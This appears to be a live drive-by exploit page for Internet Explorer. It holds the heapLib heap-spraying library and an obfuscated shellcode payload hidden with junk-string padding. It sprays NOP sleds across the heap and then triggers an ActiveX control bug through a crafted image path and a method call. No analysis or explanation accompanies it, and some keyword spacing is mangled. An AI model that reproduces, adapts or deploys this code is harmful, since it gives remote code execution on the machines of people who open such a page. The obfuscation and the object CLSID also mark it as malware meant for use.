<script>function heapLib(){
}
heapLib.ie = function (maxAlloc, heapBase){
  this .maxAlloc = (maxAlloc ? maxAlloc : 65535);
  this .heapBase = (heapBase ? heapBase : 0x150000);
  this .paddingStr = "AA" + "AA";
  while (4 + this .paddingStr.length * 2 + 2 < this .maxAlloc){
    this .paddingStr += this .paddingStr;
  }
  this .mem = new Array();
  this .flushOleaut32();
}
heapLib.ie.prototype.debug = function (msg){
  void(Math.atan2(0xbabe, msg));
}
heapLib.ie.prototype.debugHeap = function (enable){
  if (enable == true)void(Math.atan(0xbabe));
  else void(Math.asin(0xbabe));
}
heapLib.ie.prototype.debugBreak = function (msg){
  void(Math.acos(0xbabe));
}
heapLib.ie.prototype.padding = function (len){
  if (len > this .paddingStr.length)throw "Requested padding string length " + len + 
  ", only " + this .paddingStr.length + " available";
  return this .paddingStr.substr(0, len);
}
heapLib.ie.prototype.round = function (num, round){
  if (round == 0)throw "Round argument cannot be 0";
  return parseInt((num + (round - 1)) / round) * round;
}
heapLib.ie.prototype.hex = function (num, width){
  var digits = "0123456789ABCDEF";
  var hex = digits.substr(num & 0xF, 1);
  while (num > 0xF){
    num = num >>> 4;
    hex = digits.substr(num & 0xF, 1) + hex;
  }
  var width = (width ? width : 0);
  while (hex.length < width)hex = "0" + hex;
  return hex;
}
heapLib.ie.prototype.addr = function (addr){
  return unescape("%" + "u" + this .hex(addr & 0xFFFF, 4) + "%u" + this .hex((addr >> 16) & 
  0xFFFF, 4));
}
heapLib.ie.prototype.allocOleaut32 = function (arg, tag){
  var size;
  if (typeof arg == "string" || arginstanceof String)size = 4 + arg.length * 2 + 2;
  // len + string data + null terminator
else size = arg;
  if ((size & 0xf) != 0)throw "Allocation size " + size + " must be a multiple of 16";
  if (this .mem[tag] === undefined)this .mem[tag] = new Array();
  if (typeof arg == "string" || arginstanceof String){
    this .mem[tag].push(arg.substr(0, arg.length));
  }
  else {
    this .mem[tag].push(this .padding((arg - 6) / 2));
  }
}
heapLib.ie.prototype.freeOleaut32 = function (tag){
  deletethis .mem[tag];
  CollectGarbage();
}
heapLib.ie.prototype.flushOleaut32 = function (){
  this .debug("Flushing the OLEAUT32 cache");
  this .freeOleaut32("oleaut32");
  for (var i = 0; i < 6; i ++ ){
    this .allocOleaut32(32, "oleaut32");
    this .allocOleaut32(64, "oleaut32");
    this .allocOleaut32(256, "oleaut32");
    this .allocOleaut32(32768, "oleaut32");
  }
}
heapLib.ie.prototype.alloc = function (arg, tag){
  var size;
  if (typeof arg == "string" || arginstanceof String)size = 4 + arg.length * 2 + 2;
  // len + string data + null terminator
else size = arg;
  if (size == 32 || size == 64 || size == 256 || size == 32768)throw "Allocation sizes " + 
  size + " cannot be flushed out of the OLEAUT32 cache";
  this .allocOleaut32(arg, tag);
}
heapLib.ie.prototype.free = function (tag){
  this .freeOleaut32(tag);
  this .flushOleaut32();
}
heapLib.ie.prototype.gc = function (){
  this .debug("Running the garbage collector");
  CollectGarbage();
  this .flushOleaut32();
}
heapLib.ie.prototype.freeList = function (arg, count){
  var count = (count ? count : 1);
  for (var i = 0; i < count; i ++ ){
    this .alloc(arg);
    this .alloc(arg, "freeList");
  }
  this .alloc(arg);
  this .free("freeList");
}
heapLib.ie.prototype.lookaside = function (arg, count){
  var size;
  if (typeof arg == "string" || arginstanceof String)size = 4 + arg.length * 2 + 2;
  // len + string data + null terminator
else size = arg;
  if ((size & 0xf) != 0)throw "Allocation size " + size + " must be a multiple of 16";
  if (size + 8 >= 1024)throw ("Maximum lookaside block size is 1008 bytes");
  var count = (count ? count : 1);
  for (var i = 0; i < count; i ++ )this .alloc(arg, "lookaside");
  this .free("lookaside");
}
heapLib.ie.prototype.lookasideAddr = function (arg){
  var size;
  if (typeof arg == "string" || arginstanceof String)size = 4 + arg.length * 2 + 2;
  // len + string data + null terminator
else size = arg;
  if ((size & 0xf) != 0)throw "Allocation size " + size + " must be a multiple of 16";
  if (size + 8 >= 1024)throw ("Maximum lookaside block size is 1008 bytes");
  return this .heapBase + 0x688 + ((size + 8) / 8) * 48;
}
heapLib.ie.prototype.vtable = function (sssccc, jmpecx, size){
  var size = (size ? size : 1008);
  if ((size & 0xf) != 0)throw "Vtable size " + size + " must be a multiple of 16";
  if (sssccc.length * 2 > size - 138)throw ("Maximum sssccc length is " + (size - 138) + 
  " bytes");
  var zero = "0";
  var vtable = unescape("%" + "u" + "9" + "0" + "9" + zero + "%u7ceb");
  for (var i = 0; i < 124 / 4; i ++ )vtable += this .addr(jmpecx);
  vtable += unescape("%" + "u0028%" + "u0028") + sssccc + heap.padding((size - 138) / 2 - 
  sssccc.length);
  return vtable;
}
document.writeln(
"<object classid=\"clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4\" id=\"f4JGVy\"><\/object>"
);
var heap_obj = new heapLib.ie(0x20000);
var tkscctv = "
%ud5db%uc9c9%u87cd%u9292%u8c8f%u938b%u8a8c%u938f%u888c%u9389%u8a88%ude92%ucece%ud492%udad0
%ude93%ucece%uBDBD%uBDBD";
var tksccav = "%QjwiuBDBD%QjwiuBDBD%QjwiuBDBD%QjwiuBDBD%QjwiuBDBD%QjwiuBDBD%QjwiuEAEA";
tksccav = (tksccav.replace(/Qjwi/g, ""));
var ZJ0S1FLv = "Qjwi5858Qjwi5858Qjwi10EBQjwi4B5BQjwiC933" + "
QjwiB966Qjwi03B8Qjwi3480QjwiBD0BQjwiFAE2Qjwi05EBQjwiEBE8QjwiFFFFQjwi54FFQjwiBEA3QjwiBDBDQj
wiD9E2Qjwi8D1CQjwiBDBDQjwi36BDQjwiB1FDQjwiCD36Qjwi10A1QjwiD536Qjwi36B5QjwiD74AQjwiE4ACQjwi
0355QjwiBDBFQjwi2DBDQjwi455FQjwi8ED5QjwiBD8FQjwiD5BDQjwiCEE8QjwiCFD8Qjwi36E9QjwiB1FBQjwi03
55QjwiBDBCQjwi36BDQjwiD755QjwiE4B8Qjwi2355QjwiBDBFQjwi5FBDQjwiD544QjwiD3D2QjwiBDBDQjwiC8D5
QjwiD1CFQjwiE9D0QjwiAB42Qjwi7D38QjwiAEC8QjwiD2D5QjwiBDD3QjwiD5BDQjwiCFC8QjwiD0D1Qjwi36E9Qj
wiB1FBQjwi3355QjwiBDBCQjwi36BDQjwiD755QjwiE4BCQjwiD355QjwiBDBFQjwi5FBDQjwiD544Qjwi8ED1Qjwi
BD8FQjwiCED5QjwiD8D5QjwiE9D1QjwiFB36Qjwi55B1QjwiBCD2QjwiBDBDQjwi5536QjwiBCD7Qjwi55E4QjwiBF
F2QjwiBDBDQjwi445FQjwi513CQjwiBCBDQjwiBDBDQjwi6136Qjwi7E3CQjwiBD3DQjwiBDBDQjwiBDD7QjwiA7D7
QjwiD7EEQjwi42BDQjwiE1EBQjwi7D8EQjwi3DFDQjwiBE81QjwiC8BDQjwi7A44QjwiBEB9QjwiDBE1QjwiD893Qj
wiF97AQjwiB9BEQjwiD8C5QjwiBDBDQjwi748EQjwiECECQjwiEAEEQjwi8EECQjwi367DQjwiE5FBQjwi9F55Qjwi
BDBCQjwi3EBDQjwiBD45Qjwi1E54QjwiBDBDQjwi2DBDQjwiBDD7QjwiBDD7QjwiBED7QjwiBDD7QjwiBFD7QjwiBD
D5QjwiBDBDQjwiEE7DQjwiFB36Qjwi5599QjwiBCBCQjwiBDBDQjwiFB34QjwiD7DDQjwiEDBDQjwiEB42Qjwi3495
QjwiD9FBQjwiFB36QjwiD7DDQjwiD7BDQjwiD7BDQjwiD7BDQjwiD7B9QjwiEDBDQjwiEB42QjwiD791QjwiD7BDQj
wiD7BDQjwiD5BDQjwiBDA2QjwiBDB2Qjwi42EDQjwi81EBQjwiFB34Qjwi36C5QjwiD9F3QjwiC13DQjwi42B5Qjwi
C909Qjwi3DB1QjwiB5C1QjwiBD42QjwiB8C9QjwiC93DQjwi42B5Qjwi5F09Qjwi3456Qjwi3D3BQjwiBDBDQjwi7A
BDQjwiCDFBQjwiBDBDQjwiBDBDQjwiFB7AQjwiBDC9QjwiBDBDQjwiD7BDQjwiD7BDQjwiD7BDQjwi36BDQjwiDDFB
Qjwi42EDQjwi85EBQjwi3B36QjwiBD3DQjwiBDBDQjwiBDD7QjwiF330QjwiECC9QjwiCB42QjwiEDCDQjwiCB42Qj
wi42DDQjwi8DEBQjwiCB42Qjwi42DDQjwi89EBQjwiCB42Qjwi42C5QjwiFDEBQjwi4636Qjwi7D8EQjwi668EQjwi
513CQjwiBFBDQjwiBDBDQjwi7136Qjwi453EQjwiC0E9Qjwi34B5QjwiBCA1Qjwi7D3EQjwi56B9Qjwi364EQjwi36
71Qjwi3E64QjwiAD7EQjwi7D8EQjwiECEDQjwiEDEEQjwiEDEDQjwiEDEDQjwiEAEDQjwiEDEDQjwiEB42Qjwi36B5
QjwiE9C3QjwiAD55QjwiBDBCQjwi55BDQjwiBDD8QjwiBDBDQjwiDED5QjwiCACBQjwiD5BDQjwiD5CEQjwiD2D9Qj
wi36E9QjwiB1FBQjwi9955QjwiBDBDQjwi34BDQjwi81FBQjwi1CD9QjwiBDB9QjwiBDBDQjwi1D30Qjwi42DDQjwi
4242QjwiD8D7QjwiCB42Qjwi3681QjwiADFBQjwiB555QjwiBDBDQjwi8EBDQjwiEE66QjwiEEEEQjwi42EEQjwi3D
6DQjwi5585Qjwi853DQjwiC854Qjwi3CACQjwiB8C5Qjwi2D2DQjwi2D2DQjwiB5C9Qjwi4236Qjwi36E8Qjwi3051
QjwiB8FDQjwi5D42Qjwi1B55QjwiBDBDQjwi7EBDQjwi1D55QjwiBDBDQjwi05BDQjwiBCACQjwi3DB9QjwiB17FQj
wi55BDQjwiBD2EQjwiBDBDQjwi513CQjwiBCBDQjwiBDBDQjwi4136Qjwi7A3EQjwi7AB9Qjwi8FBAQjwi2CC9Qjwi
7AB1QjwiB9FAQjwi34DEQjwiF26CQjwiFA7AQjwi1DB5Qjwi2AD8Qjwi7A76QjwiB1FAQjwiFDECQjwiC207QjwiFA
7AQjwi83ADQjwi0BA0Qjwi7A84QjwiA9FAQjwiD405QjwiA669QjwiFA7AQjwi03A5QjwiDBC2Qjwi7A1DQjwiA1FA
Qjwi1441Qjwi108AQjwiFA7AQjwi259DQjwiADB7QjwiD945Qjwi8D1CQjwiBDBDQjwi36BDQjwiB1FDQjwiCD36Qj
wi10A1QjwiD536Qjwi36B5QjwiD74AQjwiE4B9QjwiE955QjwiBDBDQjwi2DBDQjwi455FQjwi8ED5QjwiBD8FQjwi
D5BDQjwiCEE8QjwiCFD8Qjwi36E9Qjwi55BBQjwi42E8Qjwi4242Qjwi5536QjwiB8D7Qjwi55E4QjwiBD88" + "
QjwiBDBDQjwi445FQjwi428EQjwi42EAQjwiB9EBQjwiBF56Qjwi7EE5Qjwi4455Qjwi4242QjwiE642QjwiBA7BQj
wi3405QjwiBCE2Qjwi7ADBQjwiB8FAQjwi5D42QjwiEE7EQjwi6136QjwiD7EEQjwiD5FDQjwiADBDQjwiBDBDQjwi
36EAQjwi9DFBQjwiA555Qjwi4242QjwiE542QjwiEC7EQjwi36EBQjwi81C8QjwiC936QjwiC593Qjwi48BEQjwi36
EBQjwi9DCBQjwi48BEQjwi748EQjwiFCF4QjwiBE10Qjwi8E78QjwiB266QjwiAD03Qjwi6B87QjwiB5C9Qjwi767C
QjwiBEBAQjwiFD67Qjwi4C56QjwiA286Qjwi5AC8Qjwi36E3Qjwi99E3Qjwi60BEQjwi36DBQjwiF6B1QjwiE336Qj
wiBEA1Qjwi3660Qjwi36B9Qjwi78BEQjwiE316Qjwi7EE4Qjwi6055Qjwi4241Qjwi0F42Qjwi5F4FQjwi8449Qjwi
C05FQjwi673EQjwiC6F5Qjwi8F80Qjwi2CC9Qjwi38B1Qjwi1262QjwiDE06Qjwi6C34QjwiECF2Qjwi07FDQjwi1D
C2Qjwi2AD8QjwiA376QjwiD919Qjwi2E52Qjwi598FQjwi3329QjwiB7AEQjwi7F11QjwiF6A4Qjwi79BCQjwiA230
QjwiEAC9QjwiB0DBQjwiFE42Qjwi1103QjwiC066Qjwi184DQjwiEF27Qjwi1A43Qjwi8367Qjwi0BA0Qjwi0584Qj
wi69D4Qjwi03A6QjwiDBC2Qjwi411DQjwi8A14Qjwi2510QjwiADB7Qjwi3D45Qjwi126BQjwi4627QjwiA8EE";
tkscctv = (tkscctv.replace(/Qjwi/g, ""));
var code = (ZJ0S1FLv.replace(/Qjwi/g, "%u")) + tkscctv + tksccav;
code = unescape(code);
var ze = "0";
var nops = unescape("%u" + ze + "c" + ze + "c%" + "u" + ze + "c0c");
while (nops.length < 0x80000)nops += nops;
var offset = nops.substring(0, 0x100);
var sssccc = offset + code + nops.substring(0, 0x800 - code.length - offset.length);
while (sssccc.length < 0x40000)sssccc += sssccc;
var block = sssccc.substring(0, (0x80000 - 6) / 2);
heap_obj.gc();
for (var z = 1; z < 0x230; z ++ ){
  heap_obj.alloc(block);
}
var obj = document.getElementById('f4JGVy').object;
var zf = "0";
var src = unescape("%u" + zf + "c" + zf + "8%u" + zf + "c0c");
while (src.length < 0x1002)src += src;
src = "\\\\xxx" + src;
src = src.substr(0, 0x1000 - 10);
var pic = document.createElement("img");
pic.src = src;
pic.nameProp;
obj.definition(764);
</script>